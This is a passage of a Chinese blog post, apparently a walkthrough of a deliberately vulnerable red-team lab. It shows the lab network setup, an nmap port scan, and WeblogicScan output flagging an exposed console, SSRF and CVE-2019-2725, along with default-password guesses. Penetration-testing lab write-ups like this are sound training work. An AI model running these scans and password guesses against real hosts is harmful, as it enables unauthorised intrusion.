@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>ATT&amp;cK实战系列—红队实战(二) | 佩里的实验室</title>
+    <meta name="generator" content="VuePress 1.8.2">
+    <link rel="icon" href="/favicon.ico">
+    <meta name="description" content="--- 加载中 ---">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+    
+    <link rel="preload" href="/assets/css/0.styles.b3ab48fe.css" as="style"><link rel="preload" href="/assets/js/app.2157803d.js" as="script"><link rel="preload" href="/assets/js/6.d710b819.js" as="script"><link rel="preload" href="/assets/js/1.c3de0c7b.js" as="script"><link rel="preload" href="/assets/js/4.06730034.js" as="script"><link rel="prefetch" href="/assets/js/10.721d813b.js"><link rel="prefetch" href="/assets/js/11.023bb962.js"><link rel="prefetch" href="/assets/js/12.ff14a839.js"><link rel="prefetch" href="/assets/js/13.4605a54d.js"><link rel="prefetch" href="/assets/js/14.95a9e9c6.js"><link rel="prefetch" href="/assets/js/15.60065c74.js"><link rel="prefetch" href="/assets/js/16.2c243327.js"><link rel="prefetch" href="/assets/js/17.1d59248c.js"><link rel="prefetch" href="/assets/js/18.6f7c8dea.js"><link rel="prefetch" href="/assets/js/19.9f73364d.js"><link rel="prefetch" href="/assets/js/20.fabafa6e.js"><link rel="prefetch" href="/assets/js/21.d91fcb0b.js"><link rel="prefetch" href="/assets/js/22.68bf39f0.js"><link rel="prefetch" href="/assets/js/23.2c5c2098.js"><link rel="prefetch" href="/assets/js/24.ba2cc227.js"><link rel="prefetch" href="/assets/js/25.49917134.js"><link rel="prefetch" href="/assets/js/26.c4bedf6f.js"><link rel="prefetch" href="/assets/js/27.99a139bc.js"><link rel="prefetch" href="/assets/js/28.0fb98c14.js"><link rel="prefetch" href="/assets/js/29.005f0172.js"><link rel="prefetch" href="/assets/js/3.1a408002.js"><link rel="prefetch" href="/assets/js/30.c06ed070.js"><link rel="prefetch" href="/assets/js/31.4b333aa1.js"><link rel="prefetch" href="/assets/js/32.b58ca2f9.js"><link rel="prefetch" href="/assets/js/33.23990a19.js"><link rel="prefetch" href="/assets/js/34.0cb312ce.js"><link rel="prefetch" href="/assets/js/35.4cdbabe0.js"><link rel="prefetch" href="/assets/js/36.10245aaa.js"><link rel="prefetch" href="/assets/js/37.8b3f8853.js"><link rel="prefetch" href="/assets/js/38.35fb2b57.js"><link rel="prefetch" href="/assets/js/39.17aeb854.js"><link rel="prefetch" href="/assets/js/40.ae4041b9.js"><link rel="prefetch" href="/assets/js/41.4f20c226.js"><link rel="prefetch" href="/assets/js/42.966c4cf3.js"><link rel="prefetch" href="/assets/js/43.3214e468.js"><link rel="prefetch" href="/assets/js/44.ae702439.js"><link rel="prefetch" href="/assets/js/45.f7f65592.js"><link rel="prefetch" href="/assets/js/46.138ba313.js"><link rel="prefetch" href="/assets/js/47.10819b21.js"><link rel="prefetch" href="/assets/js/48.b53e8a2c.js"><link rel="prefetch" href="/assets/js/49.b66f8d5f.js"><link rel="prefetch" href="/assets/js/5.6542d400.js"><link rel="prefetch" href="/assets/js/50.0d40db64.js"><link rel="prefetch" href="/assets/js/51.a2261973.js"><link rel="prefetch" href="/assets/js/52.42786f04.js"><link rel="prefetch" href="/assets/js/53.52116a2c.js"><link rel="prefetch" href="/assets/js/54.bbe77239.js"><link rel="prefetch" href="/assets/js/55.4ca3b81d.js"><link rel="prefetch" href="/assets/js/56.30376eac.js"><link rel="prefetch" href="/assets/js/57.192351ec.js"><link rel="prefetch" href="/assets/js/58.e9751df3.js"><link rel="prefetch" href="/assets/js/59.ec10a9ec.js"><link rel="prefetch" href="/assets/js/60.3b3a112a.js"><link rel="prefetch" href="/assets/js/61.260eaa94.js"><link rel="prefetch" href="/assets/js/62.3bacfb5f.js"><link rel="prefetch" href="/assets/js/63.d4a97e36.js"><link rel="prefetch" href="/assets/js/64.db5939fd.js"><link rel="prefetch" href="/assets/js/65.e6369e46.js"><link rel="prefetch" href="/assets/js/66.e6acc251.js"><link rel="prefetch" href="/assets/js/67.fca927ad.js"><link rel="prefetch" href="/assets/js/68.f12bd9fa.js"><link rel="prefetch" href="/assets/js/69.09abcac1.js"><link rel="prefetch" href="/assets/js/7.e8a47b47.js"><link rel="prefetch" href="/assets/js/70.0840639a.js"><link rel="prefetch" href="/assets/js/71.cb5b826c.js"><link rel="prefetch" href="/assets/js/72.89a42c08.js"><link rel="prefetch" href="/assets/js/73.3817e6d8.js"><link rel="prefetch" href="/assets/js/74.7514eb1b.js"><link rel="prefetch" href="/assets/js/75.d40022e0.js"><link rel="prefetch" href="/assets/js/76.4badd923.js"><link rel="prefetch" href="/assets/js/77.20705682.js"><link rel="prefetch" href="/assets/js/8.fd3ce694.js"><link rel="prefetch" href="/assets/js/9.8445b0c7.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.b3ab48fe.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar" data-v-1aefc0b4><div data-v-1aefc0b4><div id="loader-wrapper" class="loading-wrapper" data-v-d48f4d20 data-v-1aefc0b4 data-v-1aefc0b4><div class="loader-main" data-v-d48f4d20><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div></div> <!----> <!----></div> <div class="password-shadow password-wrapper-out" style="display:none;" data-v-25ba6db2 data-v-1aefc0b4 data-v-1aefc0b4><h3 class="title" data-v-25ba6db2 data-v-25ba6db2>佩里的实验室</h3> <p class="description" data-v-25ba6db2 data-v-25ba6db2>--- 加载中 ---</p> <label id="box" class="inputBox" data-v-25ba6db2 data-v-25ba6db2><input type="password" value="" data-v-25ba6db2> <span data-v-25ba6db2>Konck! Knock!</span> <button data-v-25ba6db2>OK</button></label> <div class="footer" data-v-25ba6db2 data-v-25ba6db2><span data-v-25ba6db2><i class="iconfont reco-theme" data-v-25ba6db2></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-25ba6db2>vuePress-theme-reco</a></span> <span data-v-25ba6db2><i class="iconfont reco-copyright" data-v-25ba6db2></i> <a data-v-25ba6db2><!---->
+            
+          <span data-v-25ba6db2>2019 - </span>
+          2022
+        </a></span></div></div> <div class="hide" data-v-1aefc0b4><header class="navbar" data-v-1aefc0b4><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/logo.jpg" alt="佩里的实验室" class="logo"> <span class="site-name">佩里的实验室</span></a> <div class="links"><div class="color-picker"><a class="color-button"><i class="iconfont reco-color"></i></a> <div class="color-picker-menu" style="display:none;"><div class="mode-options"><h4 class="title">Choose mode</h4> <ul class="color-mode-options"><li class="dark">dark</li><li class="auto active">auto</li><li class="light">light</li></ul></div></div></div> <div class="search-box"><i class="iconfont reco-search"></i> <input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link"><i class="iconfont reco-home"></i>
+  主页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
+      分类
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/技术杂谈/" class="nav-link"><i class="undefined"></i>
+  技术杂谈
+</a></li><li class="dropdown-item"><!----> <a href="/categories/未定义的/" class="nav-link"><i class="undefined"></i>
+  未定义的
+</a></li><li class="dropdown-item"><!----> <a href="/categories/生活小记/" class="nav-link"><i class="undefined"></i>
+  生活小记
+</a></li><li class="dropdown-item"><!----> <a href="/categories/学习笔记/" class="nav-link"><i class="undefined"></i>
+  学习笔记
+</a></li></ul></div></div><div class="nav-item"><a href="/tag/" class="nav-link"><i class="iconfont reco-tag"></i>
+  标签
+</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
+  时间线
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-message"></i>
+      联系
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/PPPerryPan" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont reco-github"></i>
+  GitHub
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask" data-v-1aefc0b4></div> <aside class="sidebar" data-v-1aefc0b4><div class="personal-info-wrapper" data-v-39576ba9 data-v-1aefc0b4><img src="/logo.jpg" alt="author-avatar" class="personal-img" data-v-39576ba9> <!----> <div class="num" data-v-39576ba9><div data-v-39576ba9><h3 data-v-39576ba9>67</h3> <h6 data-v-39576ba9>文章</h6></div> <div data-v-39576ba9><h3 data-v-39576ba9>10</h3> <h6 data-v-39576ba9>标签</h6></div></div> <ul class="social-links" data-v-39576ba9></ul> <hr data-v-39576ba9></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link"><i class="iconfont reco-home"></i>
+  主页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
+      分类
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/技术杂谈/" class="nav-link"><i class="undefined"></i>
+  技术杂谈
+</a></li><li class="dropdown-item"><!----> <a href="/categories/未定义的/" class="nav-link"><i class="undefined"></i>
+  未定义的
+</a></li><li class="dropdown-item"><!----> <a href="/categories/生活小记/" class="nav-link"><i class="undefined"></i>
+  生活小记
+</a></li><li class="dropdown-item"><!----> <a href="/categories/学习笔记/" class="nav-link"><i class="undefined"></i>
+  学习笔记
+</a></li></ul></div></div><div class="nav-item"><a href="/tag/" class="nav-link"><i class="iconfont reco-tag"></i>
+  标签
+</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
+  时间线
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-message"></i>
+      联系
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/PPPerryPan" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont reco-github"></i>
+  GitHub
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav> <!----> </aside> <div class="password-shadow password-wrapper-in" style="display:none;" data-v-25ba6db2 data-v-1aefc0b4><h3 class="title" data-v-25ba6db2 data-v-25ba6db2>ATT&amp;cK实战系列—红队实战(二)</h3> <!----> <label id="box" class="inputBox" data-v-25ba6db2 data-v-25ba6db2><input type="password" value="" data-v-25ba6db2> <span data-v-25ba6db2>Konck! Knock!</span> <button data-v-25ba6db2>OK</button></label> <div class="footer" data-v-25ba6db2 data-v-25ba6db2><span data-v-25ba6db2><i class="iconfont reco-theme" data-v-25ba6db2></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-25ba6db2>vuePress-theme-reco</a></span> <span data-v-25ba6db2><i class="iconfont reco-copyright" data-v-25ba6db2></i> <a data-v-25ba6db2><!---->
+            
+          <span data-v-25ba6db2>2019 - </span>
+          2022
+        </a></span></div></div> <div data-v-1aefc0b4><main class="page"><section><div class="page-title"><h1 class="title">ATT&amp;cK实战系列—红队实战(二)</h1> <div data-v-f875f3fc><!----> <i class="iconfont reco-date" data-v-f875f3fc><span data-v-f875f3fc>2022/9/10</span></i> <!----> <i class="tags iconfont reco-tag" data-v-f875f3fc><span class="tag-item" data-v-f875f3fc>网络安全</span></i></div></div> <div class="theme-reco-content content__default"><h2 id="环境搭建"><a href="#环境搭建" class="header-anchor">#</a> 环境搭建</h2> <p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/" target="_blank" rel="noopener noreferrer">漏洞详情 (qiyuanxuetang.net)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>拓扑：</p> <p><img src="/assets/img/tuopu.28df7ca6.jpg" alt="img"></p> <h3 id="环境说明"><a href="#环境说明" class="header-anchor">#</a> 环境说明</h3> <p>网络配置：</p> <p><img src="/assets/img/image-20220902201716802.0aa6a687.png" alt="image-20220902201716802"></p> <p><img src="/assets/img/image-20220902221502005.e3c2f355.png" alt="image-20220902221502005"></p> <p>内网网段：10.10.10.1/24</p> <p>DMZ网段：192.168.211.1/24</p> <p>测试机地址：192.168.211.147（Kali Linux）</p> <p>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>deny all tcp ports：10.10.10.1
+allow all tcp ports：10.10.10.0/24
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="web-机密码错误问题"><a href="#web-机密码错误问题" class="header-anchor">#</a> Web 机密码错误问题</h3> <p>根据网上资料显示，可恢复快照到 V1.3 解决。</p> <p>但是，恢复快照就没意思了，所以用另一种方法，进PE直接把密码给改了：</p> <p><img src="/assets/img/image-20220902224528402.dea4daf7.png" alt="image-20220902224528402"></p> <p>重启，一个不留神进磁盘检测了，让他扫算了。<s>然而我虚拟机还是在NAS上的不在本地。。。</s></p> <p><img src="/assets/img/image-20220902224701716.dbd70278.png" alt="image-20220902224701716"></p> <p>进来了</p> <p><img src="/assets/img/image-20220902225317616.61dcc555.png" alt="image-20220902225317616"></p> <h3 id="web-服务配置"><a href="#web-服务配置" class="header-anchor">#</a> Web 服务配置</h3> <p>Web机器中启用 Web 服务</p> <blockquote><p>C:\Oracle\Middleware\user_projects\domains\base_domain\bin\stopWebLogic.cmd   ( Request Admin)</p></blockquote> <p><img src="/assets/img/image-20220903163549673.aa0bea3f.png" alt="image-20220903163549673"></p> <p><img src="/assets/img/image-20220903164500501.5b5acb89.png" alt="image-20220903164500501"></p> <p>Kali 中尝试访问：</p> <p><img src="/assets/img/image-20220903164404229.ee818012.png" alt="image-20220903164404229"></p> <h3 id="环境确认"><a href="#环境确认" class="header-anchor">#</a> 环境确认</h3> <p>看IP，并确认网络状态正常。</p> <blockquote><p>Kali: 192.168.111.128</p> <p>Web: 192.168.111.80, 10.10.10.80</p> <p>PC: 192.168.111.201, 10.10.10.201</p> <p>DC: 10.10.10.10</p></blockquote> <p><img src="/assets/img/image-20220902232152055.522138d8.png" alt="image-20220902232152055"></p> <p><img src="/assets/img/image-20220902231847909.0d19e4f2.png" alt="image-20220902231847909"></p> <p><img src="/assets/img/image-20220902231857759.3b48c34b.png" alt="image-20220902231857759"></p> <h2 id="信息收集"><a href="#信息收集" class="header-anchor">#</a> 信息收集</h2> <p>nmap 扫一下 Web 看看</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
+└─<span class="token comment"># nmap -sS -v 192.168.111.80</span>
+
+Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-09-03 04:45 EDT
+Initiating ARP Ping Scan at 04:45
+Scanning <span class="token number">192.168</span>.111.80 <span class="token punctuation">[</span><span class="token number">1</span> port<span class="token punctuation">]</span>
+Completed ARP Ping Scan at 04:45, <span class="token number">0</span>.22s elapsed <span class="token punctuation">(</span><span class="token number">1</span> total hosts<span class="token punctuation">)</span>
+Initiating Parallel DNS resolution of <span class="token number">1</span> host. at 04:45
+Completed Parallel DNS resolution of <span class="token number">1</span> host. at 04:45, <span class="token number">0</span>.01s elapsed
+Initiating SYN Stealth Scan at 04:45
+Scanning <span class="token number">192.168</span>.111.80 <span class="token punctuation">(</span><span class="token number">192.168</span>.111.80<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">1000</span> ports<span class="token punctuation">]</span>
+Discovered <span class="token function">open</span> port <span class="token number">445</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">139</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">3389</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">135</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">80</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">49154</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">7001</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">49152</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">49155</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">49153</span>/tcp on <span class="token number">192.168</span>.111.80
+Discovered <span class="token function">open</span> port <span class="token number">1433</span>/tcp on <span class="token number">192.168</span>.111.80
+Completed SYN Stealth Scan at 04:46, <span class="token number">4</span>.13s elapsed <span class="token punctuation">(</span><span class="token number">1000</span> total ports<span class="token punctuation">)</span>
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.111.80 <span class="token punctuation">(</span><span class="token number">192.168</span>.111.80<span class="token punctuation">)</span>
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00031s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">989</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT      STATE SERVICE
+<span class="token number">80</span>/tcp    <span class="token function">open</span>  http
+<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc
+<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn
+<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds
+<span class="token number">1433</span>/tcp  <span class="token function">open</span>  ms-sql-s
+<span class="token number">3389</span>/tcp  <span class="token function">open</span>  ms-wbt-server
+<span class="token number">7001</span>/tcp  <span class="token function">open</span>  afs3-callback
+<span class="token number">49152</span>/tcp <span class="token function">open</span>  unknown
+<span class="token number">49153</span>/tcp <span class="token function">open</span>  unknown
+<span class="token number">49154</span>/tcp <span class="token function">open</span>  unknown
+<span class="token number">49155</span>/tcp <span class="token function">open</span>  unknown
+MAC Address: 00:0C:29:5A:92:F5 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+
+Read data files from: /usr/bin/<span class="token punctuation">..</span>/share/nmap
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">4.50</span> seconds
+           Raw packets sent: <span class="token number">1990</span> <span class="token punctuation">(</span><span class="token number">87</span>.544KB<span class="token punctuation">)</span> <span class="token operator">|</span> Rcvd: <span class="token number">12</span> <span class="token punctuation">(</span>512B<span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><p>可见 80、135、139、445、1433、3389、7001、49152、49153、49154 端口处于启用状态</p> <p><strong>端口分析</strong></p> <ul><li>445 端口开放意味着存在 smb 服务，可能存在ms17_010永恒之蓝漏洞。</li> <li>139 端口，就存在 Samba 服务，可能存在爆破/未授权访问/远程命令执行漏洞。</li> <li>1433 端口，就存在 mssql 服务，可能存在爆破/注入/SA弱口令。</li> <li>7001 端口可能存在 Weblogic 反序列化漏洞。</li></ul> <p>前面访问80端口的时候可见，里面是空白的没有内容，那直接试试扫7001的 Weblogic 看看有没有漏洞。</p> <p>工具：<a href="https://github.com/dr0op/WeblogicScan" target="_blank" rel="noopener noreferrer">dr0op/WeblogicScan: 增强版WeblogicScan、检测结果更精确、插件化、添加CVE-2019-2618，CVE-2019-2729检测，Python3支持 (github.com)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <blockquote><p>也可以使用 AWVS</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Documents/Git/WeblogicScan<span class="token punctuation">]</span>
+└─<span class="token comment"># python3 WeblogicScan.py 192.168.111.80 7001</span>
+
+__        __   _     _             _        ____                  
+<span class="token punctuation">\</span> <span class="token punctuation">\</span>      / /__<span class="token operator">|</span> <span class="token operator">|</span>__ <span class="token operator">|</span> <span class="token operator">|</span> ___   __ _<span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___  / ___<span class="token operator">|</span>  ___ __ _ _ __  
+ <span class="token punctuation">\</span> <span class="token punctuation">\</span> /<span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span> <span class="token string">'_ \| |/ _ \ / _` | |/ __| \___ \ / __/ _` | '</span>_ <span class="token punctuation">\</span> 
+  <span class="token punctuation">\</span> V  V /  __/ <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__   ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>
+   <span class="token punctuation">\</span>_/<span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_.__/<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/ <span class="token punctuation">\</span>__, <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span> <span class="token operator">|</span>____/ <span class="token punctuation">\</span>___<span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>
+                             <span class="token operator">|</span>___/ 
+      From WeblogicScan V1.2 Fixed by Ra1ndr0op: drops.org.cn <span class="token operator">|</span> V <span class="token number">1.3</span>.1 
+
+Welcome To WeblogicScan <span class="token operator">!</span><span class="token operator">!</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 weblogic-console
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>The target Weblogic console address is exposed<span class="token operator">!</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>The path is: http://192.168.111.80:7001/console/login/LoginForm.jsp
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Please try weak password blasting<span class="token operator">!</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Weblogic后台路径存在
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 SSRF
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>The target Weblogic UDDI module is exposed<span class="token operator">!</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>The path is: http://192.168.111.80:7001/uddiexplorer/
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>Please verify the SSRF vulnerability<span class="token operator">!</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>SSRF 漏洞存在
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20192725
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>The target weblogic has a JAVA deserialization vulnerability:CVE-2019-2725
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span>CVE-2019-2725 漏洞存在
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20192729
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>CVE20192729 未成功检测，请检查网络连接或或目标存在负载中间件
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE201710271
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2017-10271
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20173506
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2017-3506
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20192618
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/weblogic
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/weblogic1
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/weblogic10
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/weblogic123
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>口令爆破失败：weblogic/Oracle@123
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>target Weblogic is not Vul CVE-2019-2618
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20182894
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2018-2894
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20182628
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>CVE20182628 未成功检测，请检查网络连接或或目标存在负载中间件
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20182893
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>CVE20182893 未成功检测，请检查网络连接或或目标存在负载中间件
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20160638
+<span class="token punctuation">[</span>-<span class="token punctuation">]</span>Target weblogic not detected CVE-2016-0638
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>开始检测 CVE20163510
